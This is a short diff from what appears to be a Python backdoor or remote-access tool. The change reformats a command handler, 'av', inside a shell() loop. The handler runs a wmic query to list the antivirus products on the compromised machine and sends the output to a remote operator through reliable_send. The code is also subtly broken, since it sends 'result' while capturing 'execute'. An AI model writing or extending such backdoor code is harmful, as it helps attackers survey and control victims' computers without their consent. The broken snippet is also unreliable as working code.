@@ -361,9 +361,7 @@ def shell():
 
         elif command == 'av':
             try:
-              execute = subprocess.run(["wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct"], shell=True, stdout=subprocess.PIPE, 
-                                         stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
+              execute = subprocess.run(["wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                 #print(result)
               reliable_send(result)
             except:
